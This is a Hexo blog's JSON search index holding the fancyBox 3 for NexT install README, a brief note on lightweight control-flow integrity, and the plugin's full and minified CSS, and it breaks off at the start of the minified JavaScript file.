{"meta":{"title":"0range的小窝","subtitle":"Trust the process.","description":null,"author":"0range","url":"https://0range228.github.io","root":"/"},"pages":[{"title":"分类","date":"2020-03-06T04:43:35.000Z","updated":"2020-03-06T08:48:05.148Z","comments":true,"path":"categories/index.html","permalink":"https://0range228.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-03-05T10:10:35.000Z","updated":"2020-03-06T08:47:44.254Z","comments":true,"path":"tags/index.html","permalink":"https://0range228.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-08-14T05:39:27.744Z","updated":"2020-08-14T05:39:27.744Z","comments":true,"path":"lib/fancybox/README.html","permalink":"https://0range228.github.io/lib/fancybox/README.html","excerpt":"","text":"fancyBox 3 for NexT If you want fancybox v2, please go to theme-next-fancybox Installation Step 0 &rarr; Delete fancybox 2 (if you want to upgrade from v2) 1$ rm -rf themes/next/source/lib/fancybox If you want to use the CDN instead of clone this repo, please jump to the Step 3. Step 1 &rarr; Go to NexT dir Change dir to NexT directory. There must be layout, source, languages and other directories: 123$ cd themes/next$ lsbower.json _config.yml docs gulpfile.coffee languages layout LICENSE.md package.json README.md scripts source test Step 2 &rarr; Get module Install module to source/lib directory: 1$ git clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox Step 3 &rarr; Set it up Enable module in NexT _config.yml file: 1fancybox: true And, if you wants to use the CDN, then need to set: 1234vendors: ... fancybox: //cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js fancybox_css: //cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css Update 12$ cd themes/next/source/lib/fancybox$ git pull"},{"title":"","date":"2020-09-22T02:45:46.826Z","updated":"2020-09-22T02:45:46.818Z","comments":true,"path":"images/IDEA-Debug笔记/轻量级CFI.html","permalink":"https://0range228.github.io/images/IDEA-Debug%E7%AC%94%E8%AE%B0/%E8%BD%BB%E9%87%8F%E7%BA%A7CFI.html","excerpt":"","text":"轻量级CFI 利用异常检测，代码注入检测，代码复用检测 监视程序加载进来的合法代码区， coremail"},{"title":"","date":"2020-08-14T05:39:27.744Z","updated":"2020-08-14T05:39:27.744Z","comments":true,"path":"lib/fancybox/source/jquery.fancybox.css","permalink":"https://0range228.github.io/lib/fancybox/source/jquery.fancybox.css","excerpt":"","text":"body.compensate-for-scrollbar { overflow: hidden; } .fancybox-active { height: auto; } .fancybox-is-hidden { left: -9999px; margin: 0; position: absolute !important; top: -9999px; visibility: hidden; } .fancybox-container { -webkit-backface-visibility: hidden; height: 100%; left: 0; outline: none; position: fixed; -webkit-tap-highlight-color: transparent; top: 0; touch-action: manipulation; transform: translateZ(0); width: 100%; z-index: 99992; } .fancybox-container * { box-sizing: border-box; } .fancybox-outer, .fancybox-inner, .fancybox-bg, .fancybox-stage { bottom: 0; left: 0; position: absolute; right: 0; top: 0; } .fancybox-outer { -webkit-overflow-scrolling: touch; overflow-y: auto; } .fancybox-bg { background: rgb(30, 30, 30); opacity: 0; transition-duration: inherit; transition-property: opacity; transition-timing-function: cubic-bezier(.47, 0, .74, .71); } .fancybox-is-open .fancybox-bg { opacity: .9; transition-timing-function: cubic-bezier(.22, .61, .36, 1); } .fancybox-infobar, .fancybox-toolbar, .fancybox-caption, .fancybox-navigation .fancybox-button { direction: ltr; opacity: 0; position: absolute; transition: opacity .25s ease, visibility 0s ease .25s; visibility: hidden; z-index: 99997; } .fancybox-show-infobar .fancybox-infobar, .fancybox-show-toolbar .fancybox-toolbar, .fancybox-show-caption .fancybox-caption, .fancybox-show-nav .fancybox-navigation .fancybox-button { opacity: 1; transition: opacity .25s ease 0s, visibility 0s ease 0s; visibility: visible; } .fancybox-infobar { color: #ccc; font-size: 13px; -webkit-font-smoothing: subpixel-antialiased; height: 44px; left: 0; line-height: 44px; min-width: 44px; mix-blend-mode: difference; padding: 0 10px; pointer-events: none; top: 0; -webkit-touch-callout: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; } .fancybox-toolbar { right: 0; top: 0; } .fancybox-stage { direction: ltr; overflow: visible; transform: translateZ(0); z-index: 99994; } .fancybox-is-open .fancybox-stage { overflow: hidden; } .fancybox-slide { -webkit-backface-visibility: hidden; /* Using without prefix would break IE11 */ display: none; height: 100%; left: 0; outline: none; overflow: auto; -webkit-overflow-scrolling: touch; padding: 44px; position: absolute; text-align: center; top: 0; transition-property: transform, opacity; white-space: normal; width: 100%; z-index: 99994; } .fancybox-slide::before { content: ''; display: inline-block; font-size: 0; height: 100%; vertical-align: middle; width: 0; } .fancybox-is-sliding .fancybox-slide, .fancybox-slide--previous, .fancybox-slide--current, .fancybox-slide--next { display: block; } .fancybox-slide--image { overflow: hidden; padding: 44px 0; } .fancybox-slide--image::before { display: none; } .fancybox-slide--html { padding: 6px; } .fancybox-content { background: #fff; display: inline-block; margin: 0; max-width: 100%; overflow: auto; -webkit-overflow-scrolling: touch; padding: 44px; position: relative; text-align: left; vertical-align: middle; } .fancybox-slide--image .fancybox-content { -webkit-animation-timing-function: cubic-bezier(.5, 0, .14, 1); animation-timing-function: cubic-bezier(.5, 0, .14, 1); -webkit-backface-visibility: hidden; background: transparent; background-repeat: no-repeat; background-size: 100% 100%; left: 0; max-width: none; overflow: visible; padding: 0; position: absolute; top: 0; transform-origin: top left; transition-property: transform, opacity; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; z-index: 99995; } .fancybox-can-zoomOut .fancybox-content { cursor: zoom-out; } .fancybox-can-zoomIn .fancybox-content { cursor: zoom-in; } .fancybox-can-swipe .fancybox-content, .fancybox-can-pan .fancybox-content { cursor: -webkit-grab; cursor: grab; } .fancybox-is-grabbing .fancybox-content { cursor: -webkit-grabbing; cursor: grabbing; } .fancybox-container [data-selectable='true'] { cursor: text; } .fancybox-image, .fancybox-spaceball { background: transparent; border: 0; height: 100%; left: 0; margin: 0; max-height: none; max-width: none; padding: 0; position: absolute; top: 0; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; width: 100%; } .fancybox-spaceball { z-index: 1; } .fancybox-slide--video .fancybox-content, .fancybox-slide--map .fancybox-content, .fancybox-slide--pdf .fancybox-content, .fancybox-slide--iframe .fancybox-content { height: 100%; overflow: visible; padding: 0; width: 100%; } .fancybox-slide--video .fancybox-content { background: #000; } .fancybox-slide--map .fancybox-content { background: #e5e3df; } .fancybox-slide--iframe .fancybox-content { background: #fff; } .fancybox-video, .fancybox-iframe { background: transparent; border: 0; display: block; height: 100%; margin: 0; overflow: hidden; padding: 0; width: 100%; } /* Fix iOS */ .fancybox-iframe { left: 0; position: absolute; top: 0; } .fancybox-error { background: #fff; cursor: default; max-width: 400px; padding: 40px; width: 100%; } .fancybox-error p { color: #444; font-size: 16px; line-height: 20px; margin: 0; padding: 0; } /* Buttons */ .fancybox-button { background: rgba(30, 30, 30, .6); border: 0; border-radius: 0; box-shadow: none; cursor: pointer; display: inline-block; height: 44px; margin: 0; padding: 10px; position: relative; transition: color .2s; vertical-align: top; visibility: inherit; width: 44px; } .fancybox-button, .fancybox-button:visited, .fancybox-button:link { color: #ccc; } .fancybox-button:hover { color: #fff; } .fancybox-button:focus { outline: none; } .fancybox-button.fancybox-focus { outline: 1px dotted; } .fancybox-button[disabled], .fancybox-button[disabled]:hover { color: #888; cursor: default; outline: none; } /* Fix IE11 */ .fancybox-button div { height: 100%; } .fancybox-button svg { display: block; height: 100%; overflow: visible; position: relative; width: 100%; } .fancybox-button svg path { fill: currentColor; stroke-width: 0; } .fancybox-button--play svg:nth-child(2), .fancybox-button--fsenter svg:nth-child(2) { display: none; } .fancybox-button--pause svg:nth-child(1), .fancybox-button--fsexit svg:nth-child(1) { display: none; } .fancybox-progress { background: #ff5268; height: 2px; left: 0; position: absolute; right: 0; top: 0; transform: scaleX(0); transform-origin: 0; transition-property: transform; transition-timing-function: linear; z-index: 99998; } /* Close button on the top right corner of html content */ .fancybox-close-small { background: transparent; border: 0; border-radius: 0; color: #ccc; cursor: pointer; opacity: .8; padding: 8px; position: absolute; right: -12px; top: -44px; z-index: 401; } .fancybox-close-small:hover { color: #fff; opacity: 1; } .fancybox-slide--html .fancybox-close-small { color: currentColor; padding: 10px; right: 0; top: 0; } .fancybox-slide--image.fancybox-is-scaling .fancybox-content { overflow: hidden; } .fancybox-is-scaling .fancybox-close-small, .fancybox-is-zoomable.fancybox-can-pan .fancybox-close-small { display: none; } /* Navigation arrows */ .fancybox-navigation .fancybox-button { background-clip: content-box; height: 100px; opacity: 0; position: absolute; top: calc(50% - 50px); width: 70px; } .fancybox-navigation .fancybox-button div { padding: 7px; } .fancybox-navigation .fancybox-button--arrow_left { left: 0; left: env(safe-area-inset-left); padding: 31px 26px 31px 6px; } .fancybox-navigation .fancybox-button--arrow_right { padding: 31px 6px 31px 26px; right: 0; right: env(safe-area-inset-right); } /* Caption */ .fancybox-caption { background: linear-gradient(to top, rgba(0, 0, 0, .85) 0%, rgba(0, 0, 0, .3) 50%, rgba(0, 0, 0, .15) 65%, rgba(0, 0, 0, .075) 75.5%, rgba(0, 0, 0, .037) 82.85%, rgba(0, 0, 0, .019) 88%, rgba(0, 0, 0, 0) 100%); bottom: 0; color: #eee; font-size: 14px; font-weight: 400; left: 0; line-height: 1.5; padding: 75px 44px 25px 44px; pointer-events: none; right: 0; text-align: center; z-index: 99996; } @supports (padding: max(0px)) { .fancybox-caption { padding: 75px max(44px, env(safe-area-inset-right)) max(25px, env(safe-area-inset-bottom)) max(44px, env(safe-area-inset-left)); } } .fancybox-caption--separate { margin-top: -50px; } .fancybox-caption__body { max-height: 50vh; overflow: auto; pointer-events: all; } .fancybox-caption a, .fancybox-caption a:link, .fancybox-caption a:visited { color: #ccc; text-decoration: none; } .fancybox-caption a:hover { color: #fff; text-decoration: underline; } /* Loading indicator */ .fancybox-loading { -webkit-animation: fancybox-rotate 1s linear infinite; animation: fancybox-rotate 1s linear infinite; background: transparent; border: 4px solid #888; border-bottom-color: #fff; border-radius: 50%; height: 50px; left: 50%; margin: -25px 0 0 -25px; opacity: .7; padding: 0; position: absolute; top: 50%; width: 50px; z-index: 99999; } @-webkit-keyframes fancybox-rotate { 100% { transform: rotate(360deg); } } @keyframes fancybox-rotate { 100% { transform: rotate(360deg); } } /* Transition effects */ .fancybox-animated { transition-timing-function: cubic-bezier(0, 0, .25, 1); } /* transitionEffect: slide */ .fancybox-fx-slide.fancybox-slide--previous { opacity: 0; transform: translate3d(-100%, 0, 0); } .fancybox-fx-slide.fancybox-slide--next { opacity: 0; transform: translate3d(100%, 0, 0); } .fancybox-fx-slide.fancybox-slide--current { opacity: 1; transform: translate3d(0, 0, 0); } /* transitionEffect: fade */ .fancybox-fx-fade.fancybox-slide--previous, .fancybox-fx-fade.fancybox-slide--next { opacity: 0; transition-timing-function: cubic-bezier(.19, 1, .22, 1); } .fancybox-fx-fade.fancybox-slide--current { opacity: 1; } /* transitionEffect: zoom-in-out */ .fancybox-fx-zoom-in-out.fancybox-slide--previous { opacity: 0; transform: scale3d(1.5, 1.5, 1.5); } .fancybox-fx-zoom-in-out.fancybox-slide--next { opacity: 0; transform: scale3d(.5, .5, .5); } .fancybox-fx-zoom-in-out.fancybox-slide--current { opacity: 1; transform: scale3d(1, 1, 1); } /* transitionEffect: rotate */ .fancybox-fx-rotate.fancybox-slide--previous { opacity: 0; transform: rotate(-360deg); } .fancybox-fx-rotate.fancybox-slide--next { opacity: 0; transform: rotate(360deg); } .fancybox-fx-rotate.fancybox-slide--current { opacity: 1; transform: rotate(0deg); } /* transitionEffect: circular */ .fancybox-fx-circular.fancybox-slide--previous { opacity: 0; transform: scale3d(0, 0, 0) translate3d(-100%, 0, 0); } .fancybox-fx-circular.fancybox-slide--next { opacity: 0; transform: scale3d(0, 0, 0) translate3d(100%, 0, 0); } .fancybox-fx-circular.fancybox-slide--current { opacity: 1; transform: scale3d(1, 1, 1) translate3d(0, 0, 0); } /* transitionEffect: tube */ .fancybox-fx-tube.fancybox-slide--previous { transform: translate3d(-100%, 0, 0) scale(.1) skew(-10deg); } .fancybox-fx-tube.fancybox-slide--next { transform: translate3d(100%, 0, 0) scale(.1) skew(10deg); } .fancybox-fx-tube.fancybox-slide--current { transform: translate3d(0, 0, 0) scale(1); } /* Styling for Small-Screen Devices */ @media all and (max-height: 576px) { .fancybox-slide { padding-left: 6px; padding-right: 6px; } .fancybox-slide--image { padding: 6px 0; } .fancybox-close-small { right: -6px; } .fancybox-slide--image .fancybox-close-small { background: #4e4e4e; color: #f2f4f6; height: 36px; opacity: 1; padding: 6px; right: 0; top: 0; width: 36px; } .fancybox-caption { padding-left: 12px; padding-right: 12px; } @supports (padding: max(0px)) { .fancybox-caption { padding-left: max(12px, env(safe-area-inset-left)); padding-right: max(12px, env(safe-area-inset-right)); } } } /* Share */ .fancybox-share { background: #f4f4f4; border-radius: 3px; max-width: 90%; padding: 30px; text-align: center; } .fancybox-share h1 { color: #222; font-size: 35px; font-weight: 700; margin: 0 0 20px 0; } .fancybox-share p { margin: 0; padding: 0; } .fancybox-share__button { border: 0; border-radius: 3px; display: inline-block; font-size: 14px; font-weight: 700; line-height: 40px; margin: 0 5px 10px 5px; min-width: 130px; padding: 0 15px; text-decoration: none; transition: all .2s; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; white-space: nowrap; } .fancybox-share__button:visited, .fancybox-share__button:link { color: #fff; } .fancybox-share__button:hover { text-decoration: none; } .fancybox-share__button--fb { background: #3b5998; } .fancybox-share__button--fb:hover { background: #344e86; } .fancybox-share__button--pt { background: #bd081d; } .fancybox-share__button--pt:hover { background: #aa0719; } .fancybox-share__button--tw { background: #1da1f2; } .fancybox-share__button--tw:hover { background: #0d95e8; } .fancybox-share__button svg { height: 25px; margin-right: 7px; position: relative; top: -1px; vertical-align: middle; width: 25px; } .fancybox-share__button svg path { fill: #fff; } .fancybox-share__input { background: transparent; border: 0; border-bottom: 1px solid #d7d7d7; border-radius: 0; color: #5d5b5b; font-size: 14px; margin: 10px 0 0 0; outline: none; padding: 10px 15px; width: 100%; } /* Thumbs */ .fancybox-thumbs { background: #ddd; bottom: 0; display: none; margin: 0; -webkit-overflow-scrolling: touch; -ms-overflow-style: -ms-autohiding-scrollbar; padding: 2px 2px 4px 2px; position: absolute; right: 0; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); top: 0; width: 212px; z-index: 99995; } .fancybox-thumbs-x { overflow-x: auto; overflow-y: hidden; } .fancybox-show-thumbs .fancybox-thumbs { display: block; } .fancybox-show-thumbs .fancybox-inner { right: 212px; } .fancybox-thumbs__list { font-size: 0; height: 100%; list-style: none; margin: 0; overflow-x: hidden; overflow-y: auto; padding: 0; position: absolute; position: relative; white-space: nowrap; width: 100%; } .fancybox-thumbs-x .fancybox-thumbs__list { overflow: hidden; } .fancybox-thumbs-y .fancybox-thumbs__list::-webkit-scrollbar { width: 7px; } .fancybox-thumbs-y .fancybox-thumbs__list::-webkit-scrollbar-track { background: #fff; border-radius: 10px; box-shadow: inset 0 0 6px rgba(0, 0, 0, .3); } .fancybox-thumbs-y .fancybox-thumbs__list::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 10px; } .fancybox-thumbs__list a { -webkit-backface-visibility: hidden; backface-visibility: hidden; background-color: rgba(0, 0, 0, .1); background-position: center center; background-repeat: no-repeat; background-size: cover; cursor: pointer; float: left; height: 75px; margin: 2px; max-height: calc(100% - 8px); max-width: calc(50% - 4px); outline: none; overflow: hidden; padding: 0; position: relative; -webkit-tap-highlight-color: transparent; width: 100px; } .fancybox-thumbs__list a::before { border: 6px solid #ff5268; bottom: 0; content: ''; left: 0; opacity: 0; position: absolute; right: 0; top: 0; transition: all .2s cubic-bezier(.25, .46, .45, .94); z-index: 99991; } .fancybox-thumbs__list a:focus::before { opacity: .5; } .fancybox-thumbs__list a.fancybox-thumbs-active::before { opacity: 1; } /* Styling for Small-Screen Devices */ @media all and (max-width: 576px) { .fancybox-thumbs { width: 110px; } .fancybox-show-thumbs .fancybox-inner { right: 110px; } .fancybox-thumbs__list a { max-width: calc(100% - 10px); } }"},{"title":"","date":"2020-08-14T05:39:27.744Z","updated":"2020-08-14T05:39:27.744Z","comments":true,"path":"lib/fancybox/source/jquery.fancybox.min.css","permalink":"https://0range228.github.io/lib/fancybox/source/jquery.fancybox.min.css","excerpt":"","text":"body.compensate-for-scrollbar{overflow:hidden}.fancybox-active{height:auto}.fancybox-is-hidden{left:-9999px;margin:0;position:absolute!important;top:-9999px;visibility:hidden}.fancybox-container{-webkit-backface-visibility:hidden;height:100%;left:0;outline:none;position:fixed;-webkit-tap-highlight-color:transparent;top:0;touch-action:manipulation;transform:translateZ(0);width:100%;z-index:99992}.fancybox-container *{box-sizing:border-box}.fancybox-bg,.fancybox-inner,.fancybox-outer,.fancybox-stage{bottom:0;left:0;position:absolute;right:0;top:0}.fancybox-outer{-webkit-overflow-scrolling:touch;overflow-y:auto}.fancybox-bg{background:#1e1e1e;opacity:0;transition-duration:inherit;transition-property:opacity;transition-timing-function:cubic-bezier(.47,0,.74,.71)}.fancybox-is-open .fancybox-bg{opacity:.9;transition-timing-function:cubic-bezier(.22,.61,.36,1)}.fancybox-caption,.fancybox-infobar,.fancybox-navigation .fancybox-button,.fancybox-toolbar{direction:ltr;opacity:0;position:absolute;transition:opacity .25s ease,visibility 0s ease .25s;visibility:hidden;z-index:99997}.fancybox-show-caption .fancybox-caption,.fancybox-show-infobar .fancybox-infobar,.fancybox-show-nav .fancybox-navigation .fancybox-button,.fancybox-show-toolbar .fancybox-toolbar{opacity:1;transition:opacity .25s ease 0s,visibility 0s ease 0s;visibility:visible}.fancybox-infobar{color:#ccc;font-size:13px;-webkit-font-smoothing:subpixel-antialiased;height:44px;left:0;line-height:44px;min-width:44px;mix-blend-mode:difference;padding:0 10px;pointer-events:none;top:0;-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.fancybox-toolbar{right:0;top:0}.fancybox-stage{direction:ltr;overflow:visible;transform:translateZ(0);z-index:99994}.fancybox-is-open .fancybox-stage{overflow:hidden}.fancybox-slide{-webkit-backface-visibility:hidden;display:none;height:100%;left:0;outline:none;overflow:auto;-webkit-overflow-scrolling:touch;padding:44px;position:absolute;text-align:center;top:0;transition-property:transform,opacity;white-space:normal;width:100%;z-index:99994}.fancybox-slide:before{content:\"\";display:inline-block;font-size:0;height:100%;vertical-align:middle;width:0}.fancybox-is-sliding .fancybox-slide,.fancybox-slide--current,.fancybox-slide--next,.fancybox-slide--previous{display:block}.fancybox-slide--image{overflow:hidden;padding:44px 0}.fancybox-slide--image:before{display:none}.fancybox-slide--html{padding:6px}.fancybox-content{background:#fff;display:inline-block;margin:0;max-width:100%;overflow:auto;-webkit-overflow-scrolling:touch;padding:44px;position:relative;text-align:left;vertical-align:middle}.fancybox-slide--image .fancybox-content{-webkit-animation-timing-function:cubic-bezier(.5,0,.14,1);animation-timing-function:cubic-bezier(.5,0,.14,1);-webkit-backface-visibility:hidden;background:transparent;background-repeat:no-repeat;background-size:100% 100%;left:0;max-width:none;overflow:visible;padding:0;position:absolute;top:0;transform-origin:top left;transition-property:transform,opacity;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;z-index:99995}.fancybox-can-zoomOut .fancybox-content{cursor:zoom-out}.fancybox-can-zoomIn .fancybox-content{cursor:zoom-in}.fancybox-can-pan .fancybox-content,.fancybox-can-swipe .fancybox-content{cursor:-webkit-grab;cursor:grab}.fancybox-is-grabbing .fancybox-content{cursor:-webkit-grabbing;cursor:grabbing}.fancybox-container [data-selectable=true]{cursor:text}.fancybox-image,.fancybox-spaceball{background:transparent;border:0;height:100%;left:0;margin:0;max-height:none;max-width:none;padding:0;position:absolute;top:0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:100%}.fancybox-spaceball{z-index:1}.fancybox-slide--iframe .fancybox-content,.fancybox-slide--map .fancybox-content,.fancybox-slide--pdf .fancybox-content,.fancybox-slide--video .fancybox-content{height:100%;overflow:visible;padding:0;width:100%}.fancybox-slide--video .fancybox-content{background:#000}.fancybox-slide--map .fancybox-content{background:#e5e3df}.fancybox-slide--iframe .fancybox-content{background:#fff}.fancybox-iframe,.fancybox-video{background:transparent;border:0;display:block;height:100%;margin:0;overflow:hidden;padding:0;width:100%}.fancybox-iframe{left:0;position:absolute;top:0}.fancybox-error{background:#fff;cursor:default;max-width:400px;padding:40px;width:100%}.fancybox-error p{color:#444;font-size:16px;line-height:20px;margin:0;padding:0}.fancybox-button{background:rgba(30,30,30,.6);border:0;border-radius:0;box-shadow:none;cursor:pointer;display:inline-block;height:44px;margin:0;padding:10px;position:relative;transition:color .2s;vertical-align:top;visibility:inherit;width:44px}.fancybox-button,.fancybox-button:link,.fancybox-button:visited{color:#ccc}.fancybox-button:hover{color:#fff}.fancybox-button:focus{outline:none}.fancybox-button.fancybox-focus{outline:1px dotted}.fancybox-button[disabled],.fancybox-button[disabled]:hover{color:#888;cursor:default;outline:none}.fancybox-button div{height:100%}.fancybox-button svg{display:block;height:100%;overflow:visible;position:relative;width:100%}.fancybox-button svg path{fill:currentColor;stroke-width:0}.fancybox-button--fsenter svg:nth-child(2),.fancybox-button--fsexit svg:first-child,.fancybox-button--pause svg:first-child,.fancybox-button--play svg:nth-child(2){display:none}.fancybox-progress{background:#ff5268;height:2px;left:0;position:absolute;right:0;top:0;transform:scaleX(0);transform-origin:0;transition-property:transform;transition-timing-function:linear;z-index:99998}.fancybox-close-small{background:transparent;border:0;border-radius:0;color:#ccc;cursor:pointer;opacity:.8;padding:8px;position:absolute;right:-12px;top:-44px;z-index:401}.fancybox-close-small:hover{color:#fff;opacity:1}.fancybox-slide--html .fancybox-close-small{color:currentColor;padding:10px;right:0;top:0}.fancybox-slide--image.fancybox-is-scaling .fancybox-content{overflow:hidden}.fancybox-is-scaling .fancybox-close-small,.fancybox-is-zoomable.fancybox-can-pan .fancybox-close-small{display:none}.fancybox-navigation .fancybox-button{background-clip:content-box;height:100px;opacity:0;position:absolute;top:calc(50% - 50px);width:70px}.fancybox-navigation .fancybox-button div{padding:7px}.fancybox-navigation .fancybox-button--arrow_left{left:0;left:env(safe-area-inset-left);padding:31px 26px 31px 6px}.fancybox-navigation .fancybox-button--arrow_right{padding:31px 6px 31px 26px;right:0;right:env(safe-area-inset-right)}.fancybox-caption{background:linear-gradient(0deg,rgba(0,0,0,.85) 0,rgba(0,0,0,.3) 50%,rgba(0,0,0,.15) 65%,rgba(0,0,0,.075) 75.5%,rgba(0,0,0,.037) 82.85%,rgba(0,0,0,.019) 88%,transparent);bottom:0;color:#eee;font-size:14px;font-weight:400;left:0;line-height:1.5;padding:75px 44px 25px;pointer-events:none;right:0;text-align:center;z-index:99996}@supports (padding:max(0px)){.fancybox-caption{padding:75px max(44px,env(safe-area-inset-right)) max(25px,env(safe-area-inset-bottom)) max(44px,env(safe-area-inset-left))}}.fancybox-caption--separate{margin-top:-50px}.fancybox-caption__body{max-height:50vh;overflow:auto;pointer-events:all}.fancybox-caption a,.fancybox-caption a:link,.fancybox-caption a:visited{color:#ccc;text-decoration:none}.fancybox-caption a:hover{color:#fff;text-decoration:underline}.fancybox-loading{-webkit-animation:a 1s linear infinite;animation:a 1s linear infinite;background:transparent;border:4px solid #888;border-bottom-color:#fff;border-radius:50%;height:50px;left:50%;margin:-25px 0 0 -25px;opacity:.7;padding:0;position:absolute;top:50%;width:50px;z-index:99999}@-webkit-keyframes a{to{transform:rotate(1turn)}}@keyframes a{to{transform:rotate(1turn)}}.fancybox-animated{transition-timing-function:cubic-bezier(0,0,.25,1)}.fancybox-fx-slide.fancybox-slide--previous{opacity:0;transform:translate3d(-100%,0,0)}.fancybox-fx-slide.fancybox-slide--next{opacity:0;transform:translate3d(100%,0,0)}.fancybox-fx-slide.fancybox-slide--current{opacity:1;transform:translateZ(0)}.fancybox-fx-fade.fancybox-slide--next,.fancybox-fx-fade.fancybox-slide--previous{opacity:0;transition-timing-function:cubic-bezier(.19,1,.22,1)}.fancybox-fx-fade.fancybox-slide--current{opacity:1}.fancybox-fx-zoom-in-out.fancybox-slide--previous{opacity:0;transform:scale3d(1.5,1.5,1.5)}.fancybox-fx-zoom-in-out.fancybox-slide--next{opacity:0;transform:scale3d(.5,.5,.5)}.fancybox-fx-zoom-in-out.fancybox-slide--current{opacity:1;transform:scaleX(1)}.fancybox-fx-rotate.fancybox-slide--previous{opacity:0;transform:rotate(-1turn)}.fancybox-fx-rotate.fancybox-slide--next{opacity:0;transform:rotate(1turn)}.fancybox-fx-rotate.fancybox-slide--current{opacity:1;transform:rotate(0deg)}.fancybox-fx-circular.fancybox-slide--previous{opacity:0;transform:scale3d(0,0,0) translate3d(-100%,0,0)}.fancybox-fx-circular.fancybox-slide--next{opacity:0;transform:scale3d(0,0,0) translate3d(100%,0,0)}.fancybox-fx-circular.fancybox-slide--current{opacity:1;transform:scaleX(1) translateZ(0)}.fancybox-fx-tube.fancybox-slide--previous{transform:translate3d(-100%,0,0) scale(.1) skew(-10deg)}.fancybox-fx-tube.fancybox-slide--next{transform:translate3d(100%,0,0) scale(.1) skew(10deg)}.fancybox-fx-tube.fancybox-slide--current{transform:translateZ(0) scale(1)}@media (max-height:576px){.fancybox-slide{padding-left:6px;padding-right:6px}.fancybox-slide--image{padding:6px 0}.fancybox-close-small{right:-6px}.fancybox-slide--image .fancybox-close-small{background:#4e4e4e;color:#f2f4f6;height:36px;opacity:1;padding:6px;right:0;top:0;width:36px}.fancybox-caption{padding-left:12px;padding-right:12px}@supports (padding:max(0px)){.fancybox-caption{padding-left:max(12px,env(safe-area-inset-left));padding-right:max(12px,env(safe-area-inset-right))}}}.fancybox-share{background:#f4f4f4;border-radius:3px;max-width:90%;padding:30px;text-align:center}.fancybox-share h1{color:#222;font-size:35px;font-weight:700;margin:0 0 20px}.fancybox-share p{margin:0;padding:0}.fancybox-share__button{border:0;border-radius:3px;display:inline-block;font-size:14px;font-weight:700;line-height:40px;margin:0 5px 10px;min-width:130px;padding:0 15px;text-decoration:none;transition:all .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;white-space:nowrap}.fancybox-share__button:link,.fancybox-share__button:visited{color:#fff}.fancybox-share__button:hover{text-decoration:none}.fancybox-share__button--fb{background:#3b5998}.fancybox-share__button--fb:hover{background:#344e86}.fancybox-share__button--pt{background:#bd081d}.fancybox-share__button--pt:hover{background:#aa0719}.fancybox-share__button--tw{background:#1da1f2}.fancybox-share__button--tw:hover{background:#0d95e8}.fancybox-share__button svg{height:25px;margin-right:7px;position:relative;top:-1px;vertical-align:middle;width:25px}.fancybox-share__button svg path{fill:#fff}.fancybox-share__input{background:transparent;border:0;border-bottom:1px solid #d7d7d7;border-radius:0;color:#5d5b5b;font-size:14px;margin:10px 0 0;outline:none;padding:10px 15px;width:100%}.fancybox-thumbs{background:#ddd;bottom:0;display:none;margin:0;-webkit-overflow-scrolling:touch;-ms-overflow-style:-ms-autohiding-scrollbar;padding:2px 2px 4px;position:absolute;right:0;-webkit-tap-highlight-color:rgba(0,0,0,0);top:0;width:212px;z-index:99995}.fancybox-thumbs-x{overflow-x:auto;overflow-y:hidden}.fancybox-show-thumbs .fancybox-thumbs{display:block}.fancybox-show-thumbs .fancybox-inner{right:212px}.fancybox-thumbs__list{font-size:0;height:100%;list-style:none;margin:0;overflow-x:hidden;overflow-y:auto;padding:0;position:absolute;position:relative;white-space:nowrap;width:100%}.fancybox-thumbs-x .fancybox-thumbs__list{overflow:hidden}.fancybox-thumbs-y .fancybox-thumbs__list::-webkit-scrollbar{width:7px}.fancybox-thumbs-y .fancybox-thumbs__list::-webkit-scrollbar-track{background:#fff;border-radius:10px;box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.fancybox-thumbs-y .fancybox-thumbs__list::-webkit-scrollbar-thumb{background:#2a2a2a;border-radius:10px}.fancybox-thumbs__list a{-webkit-backface-visibility:hidden;backface-visibility:hidden;background-color:rgba(0,0,0,.1);background-position:50%;background-repeat:no-repeat;background-size:cover;cursor:pointer;float:left;height:75px;margin:2px;max-height:calc(100% - 8px);max-width:calc(50% - 4px);outline:none;overflow:hidden;padding:0;position:relative;-webkit-tap-highlight-color:transparent;width:100px}.fancybox-thumbs__list a:before{border:6px solid #ff5268;bottom:0;content:\"\";left:0;opacity:0;position:absolute;right:0;top:0;transition:all .2s cubic-bezier(.25,.46,.45,.94);z-index:99991}.fancybox-thumbs__list a:focus:before{opacity:.5}.fancybox-thumbs__list a.fancybox-thumbs-active:before{opacity:1}@media (max-width:576px){.fancybox-thumbs{width:110px}.fancybox-show-thumbs .fancybox-inner{right:110px}.fancybox-thumbs__list a{max-width:calc(100% - 10px)}}"},{"title":"","date":"2020-08-14T05:39:27.745Z","updated":"2020-08-14T05:39:27.745Z","comments":true,"path":"lib/fancybox/source/jquery.fancybox.min.js","permalink":"https://0range228.github.io/lib/fancybox/source/jquery.fancybox.min.js","excerpt":"","text":"// ================================================== // fancyBox v3.5.7 // // Licensed GPLv3 for open source use // or fancyBox Commercial License for commercial use // // http://fancyapps.com/fancybox/ // Copyright 2019 fancyApps // // ================================================== !function(t,e,n,o){\"use strict\";function i(t,e){var 